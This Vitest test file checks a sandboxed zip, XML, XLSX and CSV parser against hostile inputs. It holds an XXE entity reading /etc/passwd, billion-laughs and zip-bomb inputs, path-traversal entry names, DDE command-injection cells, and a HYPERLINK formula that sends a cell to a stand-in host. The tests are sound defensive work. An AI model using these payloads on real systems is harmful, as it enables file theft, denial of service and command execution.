/**
 * Parser logic (B-12), called in-process for speed and precise assertions. The same modules run inside the
 * restricted child in runner.test.ts; these tests cover the edge cases and the adversarial inputs.
 */
import { describe, expect, it } from "vitest";
import { DEFAULT_SANDBOX_LIMITS } from "./limits.js";
import { validateParseResponse, storableText, InvalidSandboxOutputError } from "./results.js";
import { decodeCsv, detectDelimiter, parseCsvBuffer } from "./sandbox/csv.mts";
import { SandboxReject, type SandboxLimits } from "./sandbox/protocol.mts";
import { isDateFormat, parseCellRef, parseXlsxBuffer, serialToIso } from "./sandbox/xlsx.mts";
import { attrByLocalName, decodeEntities, tokenize } from "./sandbox/xml.mts";
import { ZipArchive, findEndOfCentralDirectory } from "./sandbox/zip.mts";
import { XLSX_WORKBOOK_TYPE, buildXlsx, buildZip, columnName } from "./testing/fixtures.js";

const L: SandboxLimits = DEFAULT_SANDBOX_LIMITS;
const zipLimits = { maxEntries: 100, maxEntryBytes: 1_000_000, maxInflatedBytes: 2_000_000 };

function reject(fn: () => unknown): string {
  try {
    fn();
  } catch (err) {
    if (err instanceof SandboxReject) return err.code;
    throw err;
  }
  throw new Error("expected a SandboxReject");
}

describe("zip reader", () => {
  it("reads stored and deflated parts and verifies their checksums", () => {
    const zip = new ZipArchive(
      buildZip([
        { name: "a.txt", data: "hello" },
        { name: "dir/b.txt", data: "world", store: true },
      ]),
      zipLimits,
    );
    expect(zip.names()).toEqual(["a.txt", "dir/b.txt"]);
    expect(zip.read("a.txt").toString()).toBe("hello");
    expect(zip.read("dir/b.txt").toString()).toBe("world");
  });

  it("refuses unsafe, duplicate or encrypted entries and truncated archives", () => {
    expect(
      reject(() => new ZipArchive(buildZip([{ name: "../evil", data: "x" }]), zipLimits)),
    ).toBe("corrupt_file");
    expect(reject(() => new ZipArchive(buildZip([{ name: "/abs", data: "x" }]), zipLimits))).toBe(
      "corrupt_file",
    );
    expect(reject(() => new ZipArchive(buildZip([{ name: "a\\b", data: "x" }]), zipLimits))).toBe(
      "corrupt_file",
    );
    expect(
      reject(
        () =>
          new ZipArchive(
            buildZip([
              { name: "A.xml", data: "1" },
              { name: "a.xml", data: "2" },
            ]),
            zipLimits,
          ),
      ),
    ).toBe("corrupt_file");
    expect(
      reject(
        () => new ZipArchive(buildZip([{ name: "a", data: "x", encrypted: true }]), zipLimits),
      ),
    ).toBe("encrypted_file");
    const whole = buildZip([{ name: "a.txt", data: "hello" }]);
    expect(reject(() => new ZipArchive(whole.subarray(0, whole.length - 5), zipLimits))).toBe(
      "corrupt_file",
    );
    expect(findEndOfCentralDirectory(Buffer.from("short"))).toBe(-1);
  });

  it("bounds what a decompression bomb can cost", () => {
    const zeros = Buffer.alloc(4_000_000);
    // honest about its size: refused when the directory is read, before anything is inflated
    expect(reject(() => new ZipArchive(buildZip([{ name: "big", data: zeros }]), zipLimits))).toBe(
      "zip_bomb",
    );
    // lies about its size: inflation stops one byte past the declared size
    const liar = new ZipArchive(
      buildZip([{ name: "big", data: zeros, declaredSize: 100 }]),
      zipLimits,
    );
    expect(reject(() => liar.read("big"))).toBe("zip_bomb");
    // many parts, each under the per-part limit: the package as a whole is over budget, whether or not anything
    // ever reads those parts (the file is promoted whole, so padding nobody opens still counts)
    const many = buildZip(
      Array.from({ length: 4 }, (_, i) => ({ name: `p${i}`, data: Buffer.alloc(900_000) })),
    );
    expect(reject(() => new ZipArchive(many, zipLimits))).toBe("zip_bomb");
    // …and parts that lie low enough to pass the directory check are still stopped by the running total
    const liars = new ZipArchive(
      buildZip(
        Array.from({ length: 3 }, (_, i) => ({
          name: `q${i}`,
          data: Buffer.alloc(900_000),
          declaredSize: 600_000,
        })),
      ),
      zipLimits,
    );
    expect(reject(() => liars.read("q0"))).toBe("zip_bomb");
    // too many entries
    const crowded = buildZip(Array.from({ length: 101 }, (_, i) => ({ name: `f${i}`, data: "" })));
    expect(reject(() => new ZipArchive(crowded, zipLimits))).toBe("zip_bomb");
  });

  it("detects a corrupted part", () => {
    const bytes = buildZip([{ name: "a.txt", data: "hello world hello world", store: true }]);
    bytes[35] = bytes[35]! ^ 0xff; // flip a byte of the stored data
    expect(reject(() => new ZipArchive(bytes, zipLimits).read("a.txt"))).toBe("corrupt_file");
  });
});

describe("xml tokenizer", () => {
  it("tokenizes elements, attributes, text, CDATA and entities", () => {
    const tokens = [
      ...tokenize(
        '<?xml version="1.0"?><!-- c --><x:a r:id="rId1" n="a &amp; b"><b/>T&#x4e2d;&lt;<![CDATA[<raw>]]></x:a>',
      ),
    ];
    expect(tokens).toEqual([
      { type: "open", name: "a", attrs: { "r:id": "rId1", n: "a & b" }, selfClosing: false },
      { type: "open", name: "b", attrs: {}, selfClosing: true },
      { type: "text", text: "T中<" },
      { type: "text", text: "<raw>" },
      { type: "close", name: "a" },
    ]);
    expect(attrByLocalName({ "r:id": "x", id: "y" }, "id", true)).toBe("x");
    expect(attrByLocalName({ id: "y" }, "id", true)).toBeUndefined();
    expect([...tokenize("<f t=\">\" a='<'/>")][0]).toMatchObject({ attrs: { t: ">", a: "<" } });
  });

  it("refuses document type declarations and undeclared entities (no XXE, no entity expansion)", () => {
    const xxe =
      '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "file:///etc/passwd">]><a>&x;</a>';
    expect(reject(() => [...tokenize(xxe)])).toBe("unsupported_structure");
    const laughs = '<!DOCTYPE l [<!ENTITY a "ha"><!ENTITY b "&a;&a;&a;&a;">]><l>&b;</l>';
    expect(reject(() => [...tokenize(laughs)])).toBe("unsupported_structure");
    expect(reject(() => decodeEntities("&xxe;"))).toBe("corrupt_file");
    expect(reject(() => decodeEntities("&#0;"))).toBe("corrupt_file");
    expect(reject(() => decodeEntities("&#xD800;"))).toBe("corrupt_file");
    expect(reject(() => [...tokenize("<a")])).toBe("corrupt_file");
    expect(reject(() => [...tokenize("<a b=c>")])).toBe("corrupt_file");
  });
});

describe("xlsx reader", () => {
  it("converts references, formats and serial dates deterministically", () => {
    expect(parseCellRef("A1")).toEqual([1, 1]);
    expect(parseCellRef("BC12")).toEqual([12, 55]);
    expect(parseCellRef("XFD1048576")).toEqual([1_048_576, 16_384]);
    expect(parseCellRef("XFE1")).toBeNull();
    expect(parseCellRef("A0")).toBeNull();
    expect(parseCellRef("a1")).toBeNull();
    expect(parseCellRef("$A$1")).toBeNull();
    expect(columnName(55)).toBe("BC");

    expect(isDateFormat("yyyy-mm-dd")).toBe(true);
    expect(isDateFormat('yyyy"年"m"月"d"日"')).toBe(true);
    expect(isDateFormat("[h]:mm:ss")).toBe(true);
    expect(isDateFormat("0.00")).toBe(false);
    expect(isDateFormat("#,##0.00;[Red](#,##0.00)")).toBe(false);
    expect(isDateFormat('0.00"d"')).toBe(false); // a literal d is not a day
    expect(isDateFormat("General")).toBe(false);
    expect(isDateFormat("@")).toBe(false);

    expect(serialToIso(1, false)).toBe("1900-01-01");
    expect(serialToIso(59, false)).toBe("1900-02-28");
    expect(serialToIso(60, false)).toBeNull(); // the day that never existed
    expect(serialToIso(61, false)).toBe("1900-03-01");
    expect(serialToIso(46387, false)).toBe("2026-12-31");
    expect(serialToIso(46387.75, false)).toBe("2026-12-31T18:00:00");
    expect(serialToIso(0.5, false)).toBe("12:00:00");
    expect(serialToIso(44925, true)).toBe("2026-12-31"); // 1904 date system
    expect(serialToIso(-1, false)).toBeNull();
    expect(serialToIso(3_000_000, false)).toBeNull();
  });

  it("returns cached values, types and anchors; a formula is never calculated", () => {
    const res = parseXlsxBuffer(
      buildXlsx([
        {
          name: "Q",
          rows: [
            ["text", 12.5, true, { error: "#DIV/0!" }, { inline: "inline <b>" }],
            [],
            [
              null,
              null,
              { formula: "SUM(B1:B1)*2", cached: 25 },
              { formula: 'IF(A1="x","y","n")', cached: "n" },
            ],
            [{ formula: "1+1" }, { formula: 'HYPERLINK("http://evil.example/"&A1)' }],
          ],
        },
      ]),
      L,
    );
    const at = (r: number, c: number) => res.cells.find((x) => x.r === r && x.c === c);
    expect(at(1, 1)).toEqual({ s: 0, r: 1, c: 1, v: "text", t: "s" });
    expect(at(1, 2)).toEqual({ s: 0, r: 1, c: 2, v: "12.5", t: "n" });
    expect(at(1, 3)).toEqual({ s: 0, r: 1, c: 3, v: "TRUE", t: "b" });
    expect(at(1, 4)).toEqual({ s: 0, r: 1, c: 4, v: "#DIV/0!", t: "e" });
    expect(at(1, 5)).toEqual({ s: 0, r: 1, c: 5, v: "inline <b>", t: "s" });
    expect(at(3, 3)).toEqual({ s: 0, r: 3, c: 3, v: "25", t: "n", f: 1 }); // the file's cached 25 — not 2 × 12.5 recomputed
    expect(at(3, 4)).toEqual({ s: 0, r: 3, c: 4, v: "n", t: "s", f: 1 });
    expect(at(4, 1)).toEqual({ s: 0, r: 4, c: 1, v: null, t: "n", f: 1 }); // 1+1 is NOT evaluated to 2
    expect(at(4, 2)?.v).toBeNull();
    expect(res.sheets).toEqual([{ name: "Q", hidden: false, cellCount: 9 }]);
    expect(res.flags).toEqual(["formula_without_cached_value", "formulas_present"]);
    expect(JSON.stringify(res)).not.toContain("evil.example"); // formula text is not carried along
  });

  it("flags hidden sheets and external links without following them; refuses embedded objects", () => {
    const two = [
      { name: "Visible", rows: [["a"]] },
      { name: "Costs", rows: [["secret margin"]], state: "veryHidden" as const },
    ];
    const res = parseXlsxBuffer(
      buildXlsx(two, {
        extraParts: [{ name: "xl/externalLinks/externalLink1.xml", data: "<externalLink/>" }],
      }),
      L,
    );
    expect(res.sheets.map((s) => [s.name, s.hidden])).toEqual([
      ["Visible", false],
      ["Costs", true],
    ]);
    expect(res.flags).toEqual(["external_links_ignored", "hidden_sheets"]);
    // an embedded OLE object or ActiveX control is another file riding inside the workbook, and the workbook is
    // promoted byte for byte: refused, not flagged
    for (const name of ["xl/embeddings/oleObject1.bin", "xl/activeX/activeX1.bin"]) {
      expect(
        reject(() => parseXlsxBuffer(buildXlsx(two, { extraParts: [{ name, data: "x" }] }), L)),
        name,
      ).toBe("unsupported_structure");
    }
  });

  it("reads the workbook the package itself points at, and only at its standard place", () => {
    const sheets = [{ name: "S", rows: [["what we would extract"]] }];
    // a decoy at the fixed name while _rels/.rels points a spreadsheet program somewhere else
    expect(
      reject(() =>
        parseXlsxBuffer(buildXlsx(sheets, { rootWorkbookTarget: "real/workbook.xml" }), L),
      ),
    ).toBe("unsupported_structure");
    expect(
      reject(() =>
        parseXlsxBuffer(buildXlsx(sheets, { rootWorkbookTarget: "../xl/workbook.xml" }), L),
      ),
    ).toBe("corrupt_file");
    expect(reject(() => parseXlsxBuffer(buildXlsx(sheets, { rootWorkbookTarget: null }), L))).toBe(
      "corrupt_file",
    );
    expect(
      parseXlsxBuffer(buildXlsx(sheets, { rootWorkbookTarget: "/xl/workbook.xml" }), L).cells,
    ).toHaveLength(1);
  });

  it("refuses two cells at one address, a non-ISO date cell, and macro sheets under any name", () => {
    const sheets = [{ name: "S", rows: [["a"]] }];
    const dup = '<row r="1"><c r="A1"><v>1</v></c><c r="A1"><v>2</v></c></row>';
    expect(reject(() => parseXlsxBuffer(buildXlsx(sheets, { firstSheetData: dup }), L))).toBe(
      "corrupt_file",
    );
    const positional = '<row r="1"><c><v>1</v></c><c><v>2</v></c></row>'; // no refs: A1, B1 — fine
    expect(
      parseXlsxBuffer(buildXlsx(sheets, { firstSheetData: positional }), L).cells,
    ).toHaveLength(2);
    const badDate = '<row r="1"><c r="A1" t="d"><v>next tuesday</v></c></row>';
    expect(reject(() => parseXlsxBuffer(buildXlsx(sheets, { firstSheetData: badDate }), L))).toBe(
      "corrupt_file",
    );
    const isoDate = '<row r="1"><c r="A1" t="d"><v>2026-12-31T08:00:00Z</v></c></row>';
    expect(
      parseXlsxBuffer(buildXlsx(sheets, { firstSheetData: isoDate }), L).cells[0],
    ).toMatchObject({
      v: "2026-12-31T08:00:00Z",
      t: "d",
    });
    expect(
      reject(() =>
        parseXlsxBuffer(
          buildXlsx(sheets, {
            extraContentTypes:
              '<Override PartName="/xl/anything/m1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>',
          }),
          L,
        ),
      ),
    ).toBe("macro_enabled");
    expect(
      reject(() =>
        parseXlsxBuffer(
          buildXlsx(sheets, {
            extraWorkbookRels:
              '<Relationship Id="rId99" Type="http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet" Target="other/m1.xml"/>',
          }),
          L,
        ),
      ),
    ).toBe("macro_enabled");
  });

  it("counts padding nobody reads, and bounds how much text one small file can turn into", () => {
    const sheets = [{ name: "S", rows: [["a"]] }];
    const padded = buildXlsx(sheets, {
      extraParts: Array.from({ length: 3 }, (_, i) => ({
        name: `customXml/pad${i}.bin`,
        data: Buffer.alloc(8),
        declaredSize: 60_000_000, // three parts that each claim 60 MB and are never referenced
      })),
    });
    expect(padded.length).toBeLessThan(10_000);
    expect(reject(() => parseXlsxBuffer(padded, L))).toBe("zip_bomb");

    // one long shared string referenced from many cells: a few kilobytes on disk, megabytes of output
    const long = "x".repeat(30_000);
    const rows = Array.from({ length: 300 }, () => [long]);
    const amplified = buildXlsx([{ name: "S", rows }]);
    expect(amplified.length).toBeLessThan(20_000);
    expect(reject(() => parseXlsxBuffer(amplified, L))).toBe("output_too_large"); // 9 M characters > 8 M
    expect(
      parseXlsxBuffer(buildXlsx([{ name: "S", rows: rows.slice(0, 200) }]), L).cells,
    ).toHaveLength(200);
  });

  it("refuses macros, non-xlsx workbooks and structural lies", () => {
    const sheets = [{ name: "S", rows: [["a"]] }];
    expect(
      reject(() =>
        parseXlsxBuffer(
          buildXlsx(sheets, { extraParts: [{ name: "xl/vbaProject.bin", data: "x" }] }),
          L,
        ),
      ),
    ).toBe("macro_enabled");
    expect(
      reject(() =>
        parseXlsxBuffer(
          buildXlsx(sheets, {
            workbookContentType: "application/vnd.ms-excel.sheet.macroEnabled.main+xml",
          }),
          L,
        ),
      ),
    ).toBe("macro_enabled");
    expect(
      reject(() =>
        parseXlsxBuffer(
          buildXlsx(sheets, {
            workbookContentType:
              "application/vnd.openxmlformats-officedocument.spreadsheetml.template.main+xml",
          }),
          L,
        ),
      ),
    ).toBe("unsupported_structure");
    expect(XLSX_WORKBOOK_TYPE).toContain("sheet.main+xml");
    expect(
      reject(() => parseXlsxBuffer(buildZip([{ name: "word/document.xml", data: "<w/>" }]), L)),
    ).toBe("corrupt_file");
    expect(reject(() => parseXlsxBuffer(Buffer.from("PK\u0003\u0004 not really a zip"), L))).toBe(
      "corrupt_file",
    );
    expect(
      reject(() => parseXlsxBuffer(buildXlsx([{ name: "x".repeat(65), rows: [["a"]] }]), L)),
    ).toBe("unsupported_structure");
  });

  it("enforces the cell cap across sheets", () => {
    const rows = Array.from({ length: 30 }, (_, r) =>
      Array.from({ length: 10 }, (_, c) => r * 10 + c),
    );
    const two = [
      { name: "A", rows },
      { name: "B", rows },
    ];
    expect(parseXlsxBuffer(buildXlsx(two), { ...L, maxCells: 600 }).cells).toHaveLength(600);
    expect(reject(() => parseXlsxBuffer(buildXlsx(two), { ...L, maxCells: 599 }))).toBe(
      "too_many_cells",
    );
  });
});

describe("csv reader", () => {
  it("handles quoting, embedded newlines and every newline style", () => {
    const res = parseCsvBuffer(Buffer.from('a,"b ""q"", c","line1\nline2"\r\n1,,3\r4,5,6\n'), L);
    const grid = res.cells.map((c) => [c.r, c.c, c.v]);
    expect(grid).toEqual([
      [1, 1, "a"],
      [1, 2, 'b "q", c'],
      [1, 3, "line1\nline2"],
      [2, 1, "1"],
      [2, 3, "3"], // the empty field keeps its column: anchors stay true
      [3, 1, "4"],
      [3, 2, "5"],
      [3, 3, "6"],
    ]);
    expect(res.cells.every((c) => c.t === "s")).toBe(true); // nothing is typed or interpreted
  });

  it("detects encoding and delimiter", () => {
    expect(decodeCsv(Buffer.from("﻿品名,单价\n", "utf8"))).toEqual({
      text: "品名,单价\n",
      encoding: "utf-8",
    });
    // "品名,单价" in GB18030 / GBK, as exported by Excel on Chinese Windows
    const gbk = Buffer.from([0xc6, 0xb7, 0xc3, 0xfb, 0x2c, 0xb5, 0xa5, 0xbc, 0xdb, 0x0a]);
    expect(decodeCsv(gbk)).toEqual({ text: "品名,单价\n", encoding: "gb18030" });
    const utf16 = Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from("a\tb\n", "utf16le")]);
    expect(parseCsvBuffer(utf16, L)).toMatchObject({ encoding: "utf-16le", delimiter: "tab" });
    expect(detectDelimiter("a;b;c\n1;2;3\n")).toBe(";");
    expect(detectDelimiter('"x,y";z\n"1,2";3\n')).toBe(";");
    expect(detectDelimiter("single column\nanother\n")).toBe(",");
    expect(reject(() => decodeCsv(Buffer.from([0xff, 0xff, 0xff, 0x80, 0x81])))).toBe(
      "unsupported_encoding",
    );
    expect(reject(() => decodeCsv(Buffer.from("a,b\u0000c\n")))).toBe("corrupt_file");
  });

  it("keeps formula-looking fields as text and flags them", () => {
    const res = parseCsvBuffer(
      Buffer.from('name,price\n"=HYPERLINK(""http://x"",""y"")",-12.5\n@SUM(1),+3\n'),
      L,
    );
    expect(res.cells.find((c) => c.r === 2 && c.c === 1)?.v).toBe('=HYPERLINK("http://x","y")');
    expect(res.cells.find((c) => c.r === 2 && c.c === 2)?.v).toBe("-12.5");
    expect(res.flags).toEqual(["formula_like_text"]);
    expect(parseCsvBuffer(Buffer.from("a,b\n-1,+2\n-0.5,+1.2e3\n"), L).flags).toEqual([]); // signed numbers are numbers
    for (const dde of ["+cmd|' /C calc'!A0", "-2+3+cmd|' /C calc'!A0", '"\tleading tab"']) {
      expect(parseCsvBuffer(Buffer.from(`a\n${dde}\n`), L).flags, dde).toEqual([
        "formula_like_text",
      ]);
    }
  });

  it("bounds the total text a CSV may turn into", () => {
    const row = `${"y".repeat(1_000)},${"z".repeat(1_000)}\n`;
    const csv = Buffer.from(row.repeat(60));
    expect(reject(() => parseCsvBuffer(csv, { ...L, maxTextChars: 100_000 }))).toBe(
      "output_too_large",
    );
    expect(parseCsvBuffer(csv, { ...L, maxTextChars: 120_000 }).cells).toHaveLength(120);
  });

  it("enforces the cell cap and refuses an unterminated quote", () => {
    const rows = Array.from({ length: 11 }, (_, i) => `r${i},x,y,z,w`).join("\n");
    expect(reject(() => parseCsvBuffer(Buffer.from(rows), { ...L, maxCells: 50 }))).toBe(
      "too_many_cells",
    );
    expect(parseCsvBuffer(Buffer.from(rows), { ...L, maxCells: 55 }).cells).toHaveLength(55);
    expect(reject(() => parseCsvBuffer(Buffer.from('a,"never closed\n1,2\n'), L))).toBe(
      "corrupt_file",
    );
  });
});

describe("sandbox output is validated before it is trusted", () => {
  const page = {
    pageNo: 1,
    width: 595,
    height: 842,
    rotation: 0,
    text: "t",
    items: [],
    itemsTruncated: false,
  };
  const pdf = (over: Record<string, unknown>) => ({
    ok: true,
    result: { kind: "pdf", pageCount: 1, pages: [page], flags: [], ...over },
  });
  const sheet = (
    cells: unknown[],
    sheets: unknown[] = [{ name: "S", hidden: false, cellCount: 1 }],
  ) => ({
    ok: true,
    result: { kind: "sheet", format: "xlsx", sheets, cells, flags: [] },
  });
  const bad = (raw: unknown) =>
    expect(() => validateParseResponse(raw, L)).toThrow(InvalidSandboxOutputError);

  it("accepts well-formed results and refusals", () => {
    expect(validateParseResponse(pdf({}), L).ok).toBe(true);
    expect(validateParseResponse(sheet([{ s: 0, r: 1, c: 1, v: "x", t: "s" }]), L).ok).toBe(true);
    expect(validateParseResponse({ ok: false, code: "corrupt_file", detail: null }, L)).toEqual({
      ok: false,
      code: "corrupt_file",
      detail: null,
    });
  });

  it("refuses results over the limits, with gaps, duplicates, or unknown fields", () => {
    bad(pdf({ pageCount: 501, pages: [] }));
    bad(pdf({ pageCount: 2 })); // claims two pages, returns one
    bad(pdf({ pages: [{ ...page, pageNo: 2 }] }));
    bad(pdf({ pages: [{ ...page, extra: "smuggled" }] }));
    bad(pdf({ flags: ["Not A Flag!"] }));
    bad(sheet([{ s: 1, r: 1, c: 1, v: "x", t: "s" }])); // unknown sheet
    bad(sheet([{ s: 0, r: 0, c: 1, v: "x", t: "s" }]));
    bad(sheet([{ s: 0, r: 1, c: 16_385, v: "x", t: "s" }]));
    bad(sheet([{ s: 0, r: 1, c: 1, v: null, t: "s" }])); // empty and not a formula
    bad(
      sheet([
        { s: 0, r: 1, c: 1, v: "x", t: "s" },
        { s: 0, r: 1, c: 1, v: "y", t: "s" },
      ]),
    );
    bad(sheet([{ s: 0, r: 1, c: 1, v: "x", t: "s", d: "not-a-date" }]));
    bad({ ok: false, code: "malware_detected", detail: null }); // not a code the sandbox may issue
    bad({ ok: true });
    bad("stream: OK");
    bad(null);
    expect(() =>
      validateParseResponse(
        sheet(Array.from({ length: 3 }, (_, i) => ({ s: 0, r: i + 1, c: 1, v: "x", t: "s" }))),
        {
          ...L,
          maxCells: 2,
        },
      ),
    ).toThrow(InvalidSandboxOutputError);
  });

  it("refuses a sheet name that is empty once made storable, and totals over the text budget", () => {
    bad(
      sheet(
        [{ s: 0, r: 1, c: 1, v: "x", t: "s" }],
        [{ name: "\u0000", hidden: false, cellCount: 1 }],
      ),
    );
    const cells = Array.from({ length: 4 }, (_, i) => ({
      s: 0,
      r: i + 1,
      c: 1,
      v: "x".repeat(30),
      t: "s",
    }));
    expect(() => validateParseResponse(sheet(cells), { ...L, maxTextChars: 100 })).toThrow(
      InvalidSandboxOutputError,
    );
    expect(validateParseResponse(sheet(cells), { ...L, maxTextChars: 120 }).ok).toBe(true);
    const items = Array.from({ length: 5 }, () => [0, 0, 1, 1, "y".repeat(30)]);
    expect(() =>
      validateParseResponse(pdf({ pages: [{ ...page, items }] }), { ...L, maxTextChars: 100 }),
    ).toThrow(InvalidSandboxOutputError);
  });

  it("makes text storable", () => {
    expect(storableText("a\u0000b")).toBe("ab");
    expect(storableText("ok 😀 中文")).toBe("ok 😀 中文");
    expect(storableText("lone \ud83d high")).toBe("lone � high");
    expect(storableText("lone \ude00 low")).toBe("lone � low");
    const res = validateParseResponse(pdf({ pages: [{ ...page, text: "x\u0000y" }] }), L);
    expect(res.ok && res.result.kind === "pdf" && res.result.pages[0]!.text).toBe("xy");
  });
});
